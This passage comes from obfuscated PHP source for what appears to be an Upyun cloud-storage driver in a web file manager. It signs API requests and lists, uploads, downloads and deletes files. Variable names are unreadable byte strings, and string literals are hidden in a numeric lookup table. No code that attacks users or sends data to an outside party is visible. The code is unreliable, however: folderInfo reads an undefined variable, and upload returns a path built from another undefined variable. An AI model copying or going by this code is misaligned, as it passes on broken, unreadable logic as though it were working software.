size($ÂŒπÖï = false) { return $this->sourceSize; } public function getContent($ë◊˛Ê±€ = false) { return $this->fileSubstr($ë◊˛Ê±€, 0, $this->sourceSize); } public function fileSubstr($π¡è≤íª = false, $◊Ÿ¸„∑À = 0, $”ªÁÓÕÂ = 0) { if (!$”ªÁÓÕÂ) { $”ªÁÓÕÂ = $this->sourceSize; } $Â˜Í…´Í = $this->sourceSize - $◊Ÿ¸„∑À; if ($”ªÁÓÕÂ >= $Â˜Í…´Í) { $”ªÁÓÕÂ = $Â˜Í…´Í; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $◊Ÿ¸„∑À, $”ªÁÓÕÂ); } if ($this->sourceType == self::TYPE_FILE) { if ($”ªÁÓÕÂ <= 0) { return $_SERVER[ß⁄ˆÇ†Œ][12]; } $ã¯‚èÉÏ = ftell($this->source); fseek_64($this->source, $ã¯‚èÉÏ + $◊Ÿ¸„∑À); $∆Ã≤≈™‰ = @fread($this->source, $”ªÁÓÕÂ); fseek_64($this->source, $ã¯‚èÉÏ); return $∆Ã≤≈™‰; } } public function hashMd5($úﬂ∑∂Ú¿ = false) { return md5($this->getContent()); } public static function hash($åÙ«∞¥ , $≠¥Ã´∆˙ = 0) { $ì»Ã˙˜ = new PathDriverStream($åÙ«∞¥ , $≠¥Ã´∆˙); return $ì»Ã˙˜->hashSimple($åÙ«∞¥ ); } public static function md5($‰ü™˚§›, $Ò†◊´¶” = 0) { $‡Õ˝ÅçÜ = new PathDriverStream($‰ü™˚§›, $Ò†◊´¶”); return $‡Õ˝ÅçÜ->hashMd5($‰ü™˚§›); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\72\x2f\57\x76\60\x2e\x61\x70\x69\x2e\165\160\x79\165\156\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($µ±Ÿ®ÃÌ) { parent::__construct(); $this->_init($µ±Ÿ®ÃÌ); } public function _init($∆ÜÈÀÈ¢) { $¿°Ãˆ¶ =& $_SERVER[ß⁄ˆÇ†Œ]; foreach ($∆ÜÈÀÈ¢ as $œæ÷ëı∑ => $•ıÃà ≈) { if (isset($this->{$œæ÷ëı∑})) { $this->{$œæ÷ëı∑} = $•ıÃà ≈; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¿°Ãˆ¶[1539] . LNG($¿°Ãˆ¶[1458])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ˆ†¯ƒ§’, $Ÿù≠π‡Î = "\x47\105\124") { $“‡é®ëñ =& $_SERVER[ß⁄ˆÇ†Œ]; $üì∞πÌµ = gmdate($“‡é®ëñ[1487]); $‹ò—®Å” = base64_encode(hash_hmac($“‡é®ëñ[1540], "{$Ÿù≠π‡Î}\46{$ˆ†¯ƒ§’}\46{$üì∞πÌµ}", md5("{$this->userpass}"), !0)); $ﬂ¶≤ì¥˝ = array("\x41\x75\164\x68\157\x72\x69\172\141\x74\151\x6f\x6e\x3a\125\120\131\x55\116\x20{$this->username}\x3a{$‹ò—®Å”}", "\104\x61\164\x65\72{$üì∞πÌµ}"); return $ﬂ¶≤ì¥˝; } public function ussRequest($‘êÊŸÊ¸, $çÑà—˘∞ = "\x47\105\x54", $µßóÂùÎ = false, $∆ß‹‘ø√ = false, $Â·æ·ØÔ = false) { $¯Ç≥‚∏≈ =& $_SERVER[ß⁄ˆÇ†Œ]; $‘êÊŸÊ¸ = trim($‘êÊŸÊ¸, $¯Ç≥‚∏≈[8]); $¯¿Ä‰àÇ = "\x2f{$this->bucket}\57{$‘êÊŸÊ¸}"; $≠‹£™«é = $this->ussHeaders($¯¿Ä‰àÇ, $çÑà—˘∞); if ($∆ß‹‘ø√) { $≠‹£™«é = array_merge($≠‹£™«é, $∆ß‹‘ø√); } $Î¡ÈÆ√æ = url_request($this->endpoint . $¯¿Ä‰àÇ, $çÑà—˘∞, $µßóÂùÎ, $≠‹£™«é, $Â·æ·ØÔ); if (!$Î¡ÈÆ√æ) { $Ç¸©ı’ö = LNG($¯Ç≥‚∏≈[1541]); $this->writeLog($Ç¸©ı’ö); return array($¯Ç≥‚∏≈[1293] => !1, $¯Ç≥‚∏≈[1283] => $Ç¸©ı’ö); } if (strtolower($çÑà—˘∞) == $¯Ç≥‚∏≈[227] || in_array($Î¡ÈÆ√æ[$¯Ç≥‚∏≈[1293]], array($¯Ç≥‚∏≈[274], $¯Ç≥‚∏≈[1542]))) { $µßóÂùÎ = $Î¡ÈÆ√æ[$¯Ç≥‚∏≈[1543]]; } else { $µßóÂùÎ = json_decode($Î¡ÈÆ√æ[$¯Ç≥‚∏≈[1283]], !0); if (!$µßóÂùÎ) { $µßóÂùÎ = $Î¡ÈÆ√æ[$¯Ç≥‚∏≈[1283]]; } else { if (!$Î¡ÈÆ√æ[$¯Ç≥‚∏≈[823]] && isset($µßóÂùÎ[$¯Ç≥‚∏≈[1544]])) { $µßóÂùÎ = $µßóÂùÎ[$¯Ç≥‚∏≈[1544]]; } } } if (!$Î¡ÈÆ√æ[$¯Ç≥‚∏≈[823]]) { $this->writeLog($this->__errorMessage($µßóÂùÎ)); } return array($¯Ç≥‚∏≈[1293] => $Î¡ÈÆ√æ[$¯Ç≥‚∏≈[823]], $¯Ç≥‚∏≈[1283] => $µßóÂùÎ); } private function __errorMessage($§·îÜÊì) { $â°ü«áÕ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$§·îÜÊì) { return $â°ü«áÕ[12]; } static $ÿØ¨ß‡È = null; if (!$ÿØ¨ß‡È) { $ÿØ¨ß‡È = I18n::getType(); } if ($ÿØ¨ß‡È != $â°ü«áÕ[1497]) { return $§·îÜÊì; } $§è£ƒ® = array($â°ü«áÕ[1545] => $â°ü«áÕ[1546], $â°ü«áÕ[1547] => $â°ü«áÕ[1548], $â°ü«áÕ[1549] => $â°ü«áÕ[1548], $â°ü«áÕ[1550] => $â°ü«áÕ[1551], $â°ü«áÕ[1552] => $â°ü«áÕ[1553], $â°ü«áÕ[1554] => $â°ü«áÕ[1555], $â°ü«áÕ[1556] => $â°ü«áÕ[1557]); return isset($§è£ƒ®[$§·îÜÊì]) ? $§è£ƒ®[$§·îÜÊì] : $§·îÜÊì; } public function mkfile($ˆâÀ‹ôÎ, $ÓÀ≤Ö‹Ø = '', $≥ö◊ÃÕ˜ = REPEAT_RENAME) { if ($this->setContent($ˆâÀ‹ôÎ, $ÓÀ≤Ö‹Ø)) { return $this->getPathOuter($ˆâÀ‹ôÎ); } return !1; } public function mkdir($È˚ƒ›øÿ, $ò—¶ÇÙá = REPEAT_SKIP) { $Ùí›˙È¶ =& $_SERVER[ß⁄ˆÇ†Œ]; $©é†Ï…∏ = trim($È˚ƒ›øÿ, $Ùí›˙È¶[8]); if ($this->_isFolder($©é†Ï…∏)) { return $this->getPathOuter($©é†Ï…∏); } $Àæ‰˛¥º = array($Ùí›˙È¶[1558]); $Ÿ¶‹¯é» = $this->ussRequest($©é†Ï…∏, $Ùí›˙È¶[257], !1, $Àæ‰˛¥º); return $Ÿ¶‹¯é»[$Ùí›˙È¶[1293]] ? $this->getPathOuter($©é†Ï…∏) : !1; } public function copyFile($˚êá°⁄∆, $ﬂá˙◊Ó¬) { $≈Ñ∞“Ò£ =& $_SERVER[ß⁄ˆÇ†Œ]; $ëññ◊ËÈ = array($≈Ñ∞“Ò£[1559] . "\x2f{$this->bucket}\57{$˚êá°⁄∆}", $≈Ñ∞“Ò£[1560]); $¯ÒãÒªú = $this->ussRequest($ﬂá˙◊Ó¬, $≈Ñ∞“Ò£[259], !1, $ëññ◊ËÈ); return $¯ÒãÒªú[$≈Ñ∞“Ò£[1293]] ? !0 : $this->getPathOuter($ﬂá˙◊Ó¬); } public function moveFile($≠©¸ÿ‚—, $›»˜¸À©) { $Ÿ¬ˆñÚ¨ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ÿ≈Íø‡» = array($Ÿ¬ˆñÚ¨[1561] . "\x2f{$this->bucket}\x2f{$≠©¸ÿ‚—}", $Ÿ¬ˆñÚ¨[1560]); $Æ¢æÈ¿Ÿ = $this->ussRequest($›»˜¸À©, $Ÿ¬ˆñÚ¨[259], !1, $Ÿ≈Íø‡»); return $Æ¢æÈ¿Ÿ[$Ÿ¬ˆñÚ¨[1293]] ? !0 : $this->getPathOuter($›»˜¸À©); } public function delFile($¥÷è„¬À) { $∞√öÚô° =& $_SERVER[ß⁄ˆÇ†Œ]; $¥‡é˙àñ = $this->ussRequest($¥÷è„¬À, $∞√öÚô°[1562]); return $¥‡é˙àñ[$∞√öÚô°[1293]] ? !0 : !1; } public function delFolder($∂ÆêÛ≈Ù) { $Ò„â≈ÁÌ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->exist($∂ÆêÛ≈Ù)) { return !0; } $this->listItemCache = !1; $ôâçÜÒ‚ = $”⁄ƒÌÓ’ = array(); $this->fileList($∂ÆêÛ≈Ù, $ôâçÜÒ‚, $”⁄ƒÌÓ’, !0); $this->listItemCache = !0; foreach ($”⁄ƒÌÓ’ as $æ√ÕÁ¢„) { $Œ‚Öüƒ≈ = $this->ussRequest($æ√ÕÁ¢„[$Ò„â≈ÁÌ[32]], $Ò„â≈ÁÌ[1562]); if (!$Œ‚Öüƒ≈[$Ò„â≈ÁÌ[1293]]) { return !1; } } foreach ($ôâçÜÒ‚ as $è«Õ¶Ìç) { $Œ‚Öüƒ≈ = $this->ussRequest($è«Õ¶Ìç, $Ò„â≈ÁÌ[1562]); if (!$Œ‚Öüƒ≈[$Ò„â≈ÁÌ[1293]]) { return !1; } } $Œ‚Öüƒ≈ = $this->ussRequest($∂ÆêÛ≈Ù, $Ò„â≈ÁÌ[1562]); return $Œ‚Öüƒ≈[$Ò„â≈ÁÌ[1293]]; } public function rename($¥æ≥„„®, $Úîî¢Ô÷) { if ($this->isFile($¥æ≥„„®)) { $Úîî¢Ô÷ = get_path_father($¥æ≥„„®) . $Úîî¢Ô÷; return $this->moveFile($¥æ≥„„®, $Úîî¢Ô÷); } return $this->renameObject($¥æ≥„„®, $Úîî¢Ô÷); } public function fileInfo($ıæ˙ﬂÖ…, $Òﬂú∑ß¬ = false, $¸ªÚ©ô¨ = array()) { $í˚‹œ»„ =& $_SERVER[ß⁄ˆÇ†Œ]; $µö∂√ÉÛ = array($í˚‹œ»„[32] => $this->pathThis($ıæ˙ﬂÖ…), $í˚‹œ»„[87] => $this->getPathOuter($í˚‹œ»„[8] . $ıæ˙ﬂÖ…), $í˚‹œ»„[33] => $í˚‹œ»„[230], $í˚‹œ»„[79] => isset($¸ªÚ©ô¨[$í˚‹œ»„[79]]) ? $¸ªÚ©ô¨[$í˚‹œ»„[79]] : 0, $í˚‹œ»„[169] => $this->ext($ıæ˙ﬂÖ…)); if ($Òﬂú∑ß¬) { return $µö∂√ÉÛ; } $µö∂√ÉÛ[$í˚‹œ»„[231]] = $µö∂√ÉÛ[$í˚‹œ»„[88]] = 0; $µö∂√ÉÛ[$í˚‹œ»„[232]] = $µö∂√ÉÛ[$í˚‹œ»„[233]] = !0; if (empty($¸ªÚ©ô¨)) { $¸ªÚ©ô¨ = $this->objectMeta($ıæ˙ﬂÖ…); if (!$¸ªÚ©ô¨) { return $µö∂√ÉÛ; } } $µö∂√ÉÛ[$í˚‹œ»„[231]] = intval($¸ªÚ©ô¨[$í˚‹œ»„[1563]]); $µö∂√ÉÛ[$í˚‹œ»„[88]] = intval($¸ªÚ©ô¨[$í˚‹œ»„[1564]]); $µö∂√ÉÛ[$í˚‹œ»„[79]] = $¸ªÚ©ô¨[$í˚‹œ»„[79]]; return $µö∂√ÉÛ; } public function folderInfo($’¡”‹”Ï, $√¨îóÄ˜ = false) { $˜åÖﬁ‚… =& $_SERVER[ß⁄ˆÇ†Œ]; $ùÖ¬èñ¿ = array($˜åÖﬁ‚…[32] => $this->pathThis($’¡”‹”Ï), $˜åÖﬁ‚…[87] => $this->getPathOuter($˜åÖﬁ‚…[8] . $’¡”‹”Ï), $˜åÖﬁ‚…[33] => $˜åÖﬁ‚…[78]); if ($√¨îóÄ˜) { return $ùÖ¬èñ¿; } $ùÖ¬èñ¿[$˜åÖﬁ‚…[231]] = $ùÖ¬èñ¿[$˜åÖﬁ‚…[88]] = 0; $ùÖ¬èñ¿[$˜åÖﬁ‚…[232]] = $ùÖ¬èñ¿[$˜åÖﬁ‚…[233]] = !0; if (empty($∫˘ «ÜΩ)) { $∫˘ «ÜΩ = $this->objectMeta($’¡”‹”Ï); if (!$∫˘ «ÜΩ) { return $ùÖ¬èñ¿; } } $ùÖ¬èñ¿[$˜åÖﬁ‚…[231]] = intval($∫˘ «ÜΩ[$˜åÖﬁ‚…[1563]]); $ùÖ¬èñ¿[$˜åÖﬁ‚…[88]] = intval($∫˘ «ÜΩ[$˜åÖﬁ‚…[1564]]); return $ùÖ¬èñ¿; } private function listObjs($õ±¨Ù˚ô, $ﬂÄ–¬¶æ = 0, $…˛É√˜Ë = 1000) { $ƒóûá¡… =& $_SERVER[ß⁄ˆÇ†Œ]; $®æª¡ã‚ = array($ƒóûá¡…[1565], $ƒóûá¡…[1566] . $…˛É√˜Ë); if ($ﬂÄ–¬¶æ) { $®æª¡ã‚[] = $ƒóûá¡…[1567] . $ﬂÄ–¬¶æ; } $ú¿è Â÷ = $this->ussRequest($õ±¨Ù˚ô, $ƒóûá¡…[261], !1, $®æª¡ã‚); return !$ú¿è Â÷[$ƒóûá¡…[1293]] ? !1 : $ú¿è Â÷[$ƒóûá¡…[1283]]; } private function fileList($∑€öπ¡¥, &$¸ôïπ¨∞, &$∂˛´é«Ì, $Ã≠˘ªúÁ = false) { $˘ëú‰«µ =& $_SERVER[ß⁄ˆÇ†Œ]; $ª÷∫£±› = $˘ëú‰«µ[12]; $îŸ∆˙»å = 1000; $ó‰ ¬ª© = rtrim($∑€öπ¡¥, $˘ëú‰«µ[8]) . $˘ëú‰«µ[8]; while (!0) { check_abort(); $·–Òí∆Ù = $this->listObjs($∑€öπ¡¥, $ª÷∫£±›, $îŸ∆˙»å); if (!$·–Òí∆Ù) { return !1; } $ª÷∫£±› = isset($·–Òí∆Ù[$˘ëú‰«µ[1568]]) ? $·–Òí∆Ù[$˘ëú‰«µ[1568]] : $˘ëú‰«µ[12]; $øàÜ¢Ô´ = isset($·–Òí∆Ù[$˘ëú‰«µ[1569]]) ? $·–Òí∆Ù[$˘ëú‰«µ[1569]] : array(); foreach ($øàÜ¢Ô´ as $ÆÂŒ∂ÆØ) { $Ñ™ÊÖ˚£ = $ÆÂŒ∂ÆØ[$˘ëú‰«µ[33]] == $˘ëú‰«µ[78] ? !0 : !1; $‘ßûπÊÊ = ltrim($ó‰ ¬ª© . $ÆÂŒ∂ÆØ[$˘ëú‰«µ[32]], $˘ëú‰«µ[8]) . ($Ñ™ÊÖ˚£ ? $˘ëú‰«µ[8] : $˘ëú‰«µ[12]); $ÛøÄ¯…å = array($˘ëú‰«µ[32] => $‘ßûπÊÊ, $˘ëú‰«µ[33] => $Ñ™ÊÖ˚£ ? $˘ëú‰«µ[78] : $˘ëú‰«µ[230], $˘ëú‰«µ[79] => $ÆÂŒ∂ÆØ[$˘ëú‰«µ[422]], $˘ëú‰«µ[1564] => $ÆÂŒ∂ÆØ[$˘ëú‰«µ[1570]]); $this->cacheMethodInfoSet($‘ßûπÊÊ, $Ñ™ÊÖ˚£, $ÛøÄ¯…å); if ($Ñ™ÊÖ˚£) { $¸ôïπ¨∞[] = $‘ßûπÊÊ; if ($Ã≠˘ªúÁ) { $this->fileList($‘ßûπÊÊ, $¸ôïπ¨∞, $∂˛´é«Ì, $Ã≠˘ªúÁ); } continue; } $∂˛´é«Ì[] = $ÛøÄ¯…å; } if (count($øàÜ¢Ô´) < $îŸ∆˙»å) { break; } } $this->cacheMethodInfoSet($∑€öπ¡¥, !0); } public function listPath($˙Î√ÿ´ò, $∆€™´ã≠ = false) { $óË†É˝± =& $_SERVER[ß⁄ˆÇ†Œ]; $¨¿Ω¡æ… = $ã¢Îóîá = array(); $this->fileList($˙Î√ÿ´ò, $¨¿Ω¡æ…, $ã¢Îóîá); foreach ($¨¿Ω¡æ… as $‰’£•¿å => $Àæ§‚ú√) { $¨¿Ω¡æ…[$‰’£•¿å] = $this->folderInfo($Àæ§‚ú√, $∆€™´ã≠); } foreach ($ã¢Îóîá as $‰’£•¿å => $Àæ§‚ú√) { $ã¢Îóîá[$‰’£•¿å] = $this->fileInfo($Àæ§‚ú√[$óË†É˝±[32]], $∆€™´ã≠, $Àæ§‚ú√); } return array($óË†É˝±[85] => $¨¿Ω¡æ…, $óË†É˝±[86] => $ã¢Îóîá); } public function has($ﬁç∏ﬁ¯œ, $áﬁ˘†µ˘ = false, $ØÏüö™Ÿ = true) { $ØÆ•œí¨ =& $_SERVER[ß⁄ˆÇ†Œ]; $°ÇÎò∆Ì = $ØÆ•œí¨[12]; $◊˚£‡é∫ = 500; $¥œ˛≤∫— = 0; $⁄Ñ€î˛Ω = 0; $£Ú–Øë∞ = rtrim($ﬁç∏ﬁ¯œ, $ØÆ•œí¨[8]) . $ØÆ•œí¨[8]; while (!0) { check_abort(); $Â∏ˆÇ¨á = $this->listObjs($ﬁç∏ﬁ¯œ, $°ÇÎò∆Ì, $◊˚£‡é∫); if (!$Â∏ˆÇ¨á) { return !1; } $°ÇÎò∆Ì = isset($Â∏ˆÇ¨á[$ØÆ•œí¨[1568]]) ? $Â∏ˆÇ¨á[$ØÆ•œí¨[1568]] : $ØÆ•œí¨[12]; $™Ì≥ê®à = isset($Â∏ˆÇ¨á[$ØÆ•œí¨[1569]]) ? $Â∏ˆÇ¨á[$ØÆ•œí¨[1569]] : array(); if (empty($™Ì≥ê®à)) { break; } $Ò¯æì¿ = array_filter($™Ì≥ê®à, function ($˜Ä«ÆÕ◊) { $ûß∫ÅÍï =& $_SERVER[ß⁄ˆÇ†Œ]; return $˜Ä«ÆÕ◊[$ûß∫ÅÍï[33]] == $ûß∫ÅÍï[78]; }); $Éˆ®êïä = count($™Ì≥ê®à); $Ò¯æì¿ = count($Ò¯æì¿); $œÏÀ«ù≥ = $Éˆ®êïä - $Ò¯æì¿; if ($áﬁ˘†µ˘) { $⁄Ñ€î˛Ω += $Ò¯æì¿; $¥œ˛≤∫— += $œÏÀ«ù≥; if ($Éˆ®êïä < $◊˚£‡é∫) { break; } continue; } if ($ØÏüö™Ÿ) { if ($œÏÀ«ù≥) { return !0; } } else { if ($Ò¯æì¿) { return !0; } } if ($Éˆ®êïä < $◊˚£‡é∫) { break; } } if ($áﬁ˘†µ˘) { return array($ØÆ•œí¨[239] => $¥œ˛≤∫—, $ØÆ•œí¨[240] => $⁄Ñ€î˛Ω); } return !1; } public function listAll($°ö®ﬂÔﬁ) { $™≈‰√úÑ =& $_SERVER[ß⁄ˆÇ†Œ]; $ò±Êü‰Ó = $∂«úƒõî = array(); $this->fileList($°ö®ﬂÔﬁ, $ò±Êü‰Ó, $∂«úƒõî, !0); $€ﬁ°‹õ§ = array_to_keyvalue($∂«úƒõî, $™≈‰√úÑ[32]); foreach ($ò±Êü‰Ó as $ÿä¯‹ÌÔ) { if (is_string($ÿä¯‹ÌÔ)) { $€ﬁ°‹õ§[$ÿä¯‹ÌÔ] = array($™≈‰√úÑ[79] => 0); } } return $this->listAllFiles($°ö®ﬂÔﬁ, $€ﬁ°‹õ§); } public function canRead($Ÿæ™Ê“ä) { return $this->exist($Ÿæ™Ê“ä) ? !0 : !1; } public function canWrite($ºá¿ø˜ö) { return $this->exist($ºá¿ø˜ö) ? !0 : !1; } public function getContent($¿åˆüﬂí) { return $this->fileSubstr($¿åˆüﬂí, 0, -1); } public function setContent($∂£Ê‚Êõ, $Ø¿ãÌú¡ = '') { $¡¢ºπÀó =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Ø¿ãÌú¡) { $Ö˜‰˚Ù” = $this->ussRequest($∂£Ê‚Êõ, $¡¢ºπÀó[257]); return $Ö˜‰˚Ù”[$¡¢ºπÀó[1293]]; } $Ó»∏˛‚ = $this->tempFile($this->pathThis($∂£Ê‚Êõ)); file_put_contents($Ó»∏˛‚, $Ø¿ãÌú¡); if ($this->upload($∂£Ê‚Êõ, $Ó»∏˛‚)) { $this->tempFileRemve($Ó»∏˛‚); return !0; } return !1; } public function fileSubstr($Ëé¸é⁄È, $ŸíÈ£¢, $›§•Ä√‹) { $‘º¿†œñ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!($Œ®ò¨˚ä = $this->link($Ëé¸é⁄È))) { return !1; } $‹¿◊Å’Ô = !1; if ($›§•Ä√‹ > 0) { $ÎÏƒÌ»Œ = $ŸíÈ£¢ + $›§•Ä√‹ - 1; $‹¿◊Å’Ô = array($‘º¿†œñ[1529] . $ŸíÈ£¢ . $‘º¿†œñ[470] . $ÎÏƒÌ»Œ); } $•‘ñƒÍÈ = url_request($Œ®ò¨˚ä, $‘º¿†œñ[261], !1, $‹¿◊Å’Ô); return $•‘ñƒÍÈ[$‘º¿†œñ[823]] ? $•‘ñƒÍÈ[$‘º¿†œñ[1283]] : !1; } public function upload($ó¥„∂øƒ, $ê∑ä†á¯, $™“•≤≈∏ = false, $Ü˙›’ÜÙ = REPEAT_REPLACE) { $é°º¢Ωò =& $_SERVER[ß⁄ˆÇ†Œ]; $®±°ËÕ¸ = IO::size($ê∑ä†á¯); if ($®±°ËÕ¸ <= 1024 * 1024 * 200) { $Ç∫Œ—∏ä = array($é°º¢Ωò[1571] . $ê∑ä†á¯); $¯÷Ò˚¨€ = $this->ussRequest($ó¥„∂øƒ, $é°º¢Ωò[259], $Ç∫Œ—∏ä); return $¯÷Ò˚¨€[$é°º¢Ωò[1293]] ? $this->getPathOuter($ó¥„∂øƒ) : !1; } $üπó≠î¥ = 1024 * 1024 * 10; $É–ë¬Â∂ = array($é°º¢Ωò[1572], $é°º¢Ωò[1573] . $®±°ËÕ¸, $é°º¢Ωò[1574], $é°º¢Ωò[1575] . $üπó≠î¥); $¯÷Ò˚¨€ = $this->ussRequest($ó¥„∂øƒ, $é°º¢Ωò[259], !1, $É–ë¬Â∂); if (!$¯÷Ò˚¨€[$é°º¢Ωò[1293]]) { return !1; } $à†õÌƒ∏ = $¯÷Ò˚¨€[$é°º¢Ωò[1283]]; $∫ã≤ßµñ = 0; $ÎöÅâûÖ = $à†õÌƒ∏[$é°º¢Ωò[1576]]; $≤Ó·®ÿÜ = fopen($ê∑ä†á¯, $é°º¢Ωò[1452]); if (!$≤Ó·®ÿÜ) { return !1; } do { $Æ†Ö⁄°¥ = $à†õÌƒ∏[$é°º¢Ωò[1577]]; fseek_64($≤Ó·®ÿÜ, $∫ã≤ßµñ); $∏¿´†˜ô = fread($≤Ó·®ÿÜ, $Æ†Ö⁄°¥); $àå–ÊîØ = 0; do { $àå–ÊîØ++; $à†õÌƒ∏ = $this->uploadPart($ó¥„∂øƒ, $à†õÌƒ∏, $∏¿´†˜ô); } while (!$à†õÌƒ∏ && $àå–ÊîØ < 3); if (!$à†õÌƒ∏) { return !1; } $ÎöÅâûÖ = $à†õÌƒ∏[$é°º¢Ωò[1576]]; $∫ã≤ßµñ += $Æ†Ö⁄°¥; } while ($ÎöÅâûÖ != -1); fclose($≤Ó·®ÿÜ); $É–ë¬Â∂ = array($é°º¢Ωò[1578], $é°º¢Ωò[1579] . $à†õÌƒ∏[$é°º¢Ωò[1580]], $é°º¢Ωò[1574]); $¯÷Ò˚¨€ = $this->ussRequest($ó¥„∂øƒ, $é°º¢Ωò[259], !1, $É–ë¬Â∂); return $¯÷Ò˚¨€[$é°º¢Ωò[1293]] ? $this->getPathOuter($ïôÉÙ´Í) : !1; } private function uploadPart($ò°¥€Ω‡, $‘µ›◊„Æ, &$Ò»˙ë˛ô) { $˛ úÚ∞¬ =& $_SERVER[ß⁄ˆÇ†Œ]; $˘„§˙∆Ã = array($˛ úÚ∞¬[1581], $˛ úÚ∞¬[1579] . $‘µ›◊„Æ[$˛ úÚ∞¬[1580]], $˛ úÚ∞¬[1582] . $‘µ›◊„Æ[$˛ úÚ∞¬[1576]], $˛ úÚ∞¬[146] . $‘µ›◊„Æ[$˛ úÚ∞¬[1577]]); $˜ÎÂ„ìä = $this->ussRequest($ò°¥€Ω‡, $˛ úÚ∞¬[259], $Ò»˙ë˛ô, $˘„§˙∆Ã); return !$˜ÎÂ„ìä[$˛ úÚ∞¬[1293]] ? $˜ÎÂ„ìä[$˛ úÚ∞¬[1293]] : $˜ÎÂ„ìä[$˛ úÚ∞¬[1283]]; } public function uploadFormData($≠Åóó˝∫, $Çˆﬁû⁄√ = 3600) { return $this->uploadPolicy($≠Åóó˝∫, $Çˆﬁû⁄√); } public function multiUploadFormData($â˙¢‰Ÿ», $ÍÄ∫Û´ó = 3600) { $–èÍ⁄ìÎ =& $_SERVER[ß⁄ˆÇ†Œ]; $ô´ûîß§ = (int) $GLOBALS[$–èÍ⁄ìÎ[7]][$–èÍ⁄ìÎ[79]]; return $this->uploadPolicy($â˙¢‰Ÿ», $ÍÄ∫Û´ó, $ô´ûîß§); } private function uploadPolicy($ãÑ¨Î∆, $ìæ†ÑÆé = 3600, $í±ùÉõö = 0) { $˚ÖÙòú° =& $_SERVER[ß⁄ˆÇ†Œ]; $•ãÛ†≤ß = $˚ÖÙòú°[8] . $this->bucket; $ÒÆ®¶¿Ë = gmdate($˚ÖÙòú°[1487]); $®Çå∏‰œ = array($˚ÖÙòú°[1583] => $this->bucket, $˚ÖÙòú°[1584] => $ãÑ¨Î∆, $˚ÖÙòú°[1585] => time() + $ìæ†ÑÆé, $˚ÖÙòú°[1586] => $ÒÆ®¶¿Ë); if ($í±ùÉõö) { $®Çå∏‰œ[$˚ÖÙòú°[1472]] = $í±ùÉõö; } $Ñ˚–û…Å = base64_encode(json_encode($®Çå∏‰œ)); $ÏÎÀØ•Å = base64_encode(hash_hmac($˚ÖÙòú°[1540], "\120\117\x53\124\46{$•ãÛ†≤ß}\46{$ÒÆ®¶¿Ë}\46{$Ñ˚–û…Å}", md5("{$this->userpass}"), !0)); $•§÷ıÖë = array($˚ÖÙòú°[293] => $Ñ˚–û…Å, $˚ÖÙòú°[1587] => "\x55\120\131\x55\x4e\40{$this->username}\x3a{$ÏÎÀØ•Å}", $˚ÖÙòú°[208] => $this->endpoint . $•ãÛ†≤ß); return $•§÷ıÖë; } public function download($çËøç∑Á, $“∑äÛŒä) { $®ñ·°¥∑ = IO::getPathInner(IO::mkfile($“∑äÛŒä)); if (!($Üõ—¸á∑ = $this->link($çËøç∑Á))) { return !1; } $Ë¬«á∞Ê = 0; $Âıó©ïÜ = 1024 * 200; $®ëΩ˝∞Œ = fopen($®ñ·°¥∑, $_SERVER[ß⁄ˆÇ†Œ][1535]); while (!0) { $„÷‡∏™± = $this->fileSubstr($çËøç∑Á, $Ë¬«á∞Ê, $Âıó©ïÜ); if ($„÷‡∏™± === !1) { return !1; } fwrite($®ëΩ˝∞Œ, $„÷‡∏™±); $Ë¬«á∞Ê += $Âıó©ïÜ; if (strlen($„÷‡∏™±) < $Âıó©ïÜ) { break; } } fclose($®ëΩ˝∞Œ); return $“∑äÛŒä; } public function link($¨í∫‘©±, $•Á˛˚⁄à = array()) { $Í˘É¬π∏ =& $_SERVER[ß⁄ˆÇ†Œ]; $¨í∫‘©± = trim($¨í∫‘©±, $Í˘É¬π∏[8]); if (!empty($this->token)) { $È„˜àÈª = strtotime(date($Í˘É¬π∏[1588])); $—Ü™”ﬁ¯ = substr(md5($this->token . $Í˘É¬π∏[369] . $È„˜àÈª . $Í˘É¬π∏[1589] . $¨í∫‘©±), 12, 8) . $È„˜àÈª; $•Á˛˚⁄à[] = $Í˘É¬π∏[1590] . $—Ü™”ﬁ¯; } $Õ«ÉÚ¸ƒ = !empty($•Á˛˚⁄à) ? $Í˘É¬π∏[76] . implode($Í˘É¬π∏[369], $•Á˛˚⁄à) : $Í˘É¬π∏[12]; return $this->getHost() . $Í˘É¬π∏[8] . $¨í∫‘©± . $Õ«ÉÚ¸ƒ; } public function fileOut($ÙÇèêéæ, $Ñöæ†÷ë = false, $ﬁ®ó∞Áï = false, $ÜÒ¨›Œæ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÙÇèêéæ, $Ñöæ†÷ë, $ﬁ®ó∞Áï, $ÜÒ¨›Œæ); } if (!$ﬁ®ó∞Áï) { $ﬁ®ó∞Áï = $this->pathThis($ÙÇèêéæ); } $ìÉÎáæπ = $Ñöæ†÷ë ? array($_SERVER[ß⁄ˆÇ†Œ][1591] . rawurlencode($ﬁ®ó∞Áï)) : array(); $ıππù°‰ = $this->link($ÙÇèêéæ, $ìÉÎáæπ); $this->fileOutLink($ıππù°‰); } public function fileOutServer($Øƒ‹ƒ˘É, $∏¢ Ä´» = false, $ößÊ€‰È = false, $öºõ≥∂ö = '') { parent::fileOut($Øƒ‹ƒ˘É, $∏¢ Ä´», $ößÊ€‰È, $öºõ≥∂ö); } public function fileOutImage($øµ‘É≠ú, $˚Ìû¯ç§ = 250) { $¿µüóÒ£ = $this->link($øµ‘É≠ú . $_SERVER[ß⁄ˆÇ†Œ][1592] . $˚Ìû¯ç§); $this->fileOutLink($¿µüóÒ£); } public function fileOutImageServer($≠ïâÚˆ‚, $ñ•¡Ω‡å = 250) { parent::fileOutImage($≠ïâÚˆ‚, $ñ•¡Ω‡å); } public function hashMd5($åù∫Çœã) { $Õ¿≤¶â™ =& $_SERVER[ß⁄ˆÇ†Œ]; $ñ∏¯‘Æú = $this->_objectMeta($åù∫Çœã); return 